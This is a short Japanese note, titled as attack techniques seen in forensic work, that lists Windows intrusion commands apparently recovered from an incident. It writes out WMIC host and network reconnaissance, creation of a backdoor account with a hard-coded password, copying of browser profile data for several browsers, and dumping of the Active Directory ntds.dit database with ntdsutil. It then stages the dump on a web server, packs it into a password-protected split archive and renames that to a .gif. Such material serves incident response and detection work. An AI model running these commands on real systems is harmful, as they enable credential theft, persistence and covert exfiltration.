# フォレンジックで見る手口

システム情報取得

```ps
wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename

wmic get MACAddress, IPAddress, DHCPEnabled, DHCPLeaseExpires, DHCPLeaseObtained, DHCPServer & nic get AdapterType, AutoSense, Name

wmic computersystem list /Format & wmic computersystem get Name, NumberOfProcessors, PrimaryOwnerName
```

ユーザー作成

```ps
wmic useraccount create UserName='voltyp-admin', Password='as&9ha2e$#&@n22n('
```


ブラウザ設定の取得

```ps
New-Item -ItemType Directory -Path "C:\Temp\browserbackups\chrome", "C:\Temp\browserbackups\firefox", "C:\Temp\browserbackups\edge", “C:\Temp\browserbackups\ie”

Copy-Item -Path "C:\Users\dean-admin\AppData\Local\Google\Chrome\User Data\Default" -Destination "C:\Windows\Temp\browserbackups\chrome" -Recurse
Copy-Item -Path "C:\Users\dean-admin\AppData\Roaming\Mozilla\Firefox\Profiles" -Destination "C:\Windows\Temp\browserbackups\firefox" -Recurse
Copy-Item -Path "C:\Users\dean-admin\AppData\Local\Microsoft\Edge\User Data\Default" -Destination "C:\Windows\Temp\browserbackups\edge" -Recurse
Copy-Item -Path "C:\Users\dean-admin\AppData\Local\Microsoft\Windows\WebCache" -Destination "C:\Windows\Temp\browserbackups\ie" -Recurse
```

ntds.dit の取得

```ps
wmic process call create "cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \"ac i ntds\" \"ifm create full C:\Windows\Temp\tmp\temp.dit""

wmic /node:webserver-01 process call create “cmd.exe /c xcopy C:\Windows\Temp\tmp\temp.dit \\webserver-01\c$\inetpub\wwwroot”

wmic /node:webserver-01 process call create “cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit”

wmic /node:webserver-01 process call create "cmd.exe /c ren \\webserver-01\c$\inetpub\wwwroot\cisco-up.7z cl64.gif"
```

```ps

```
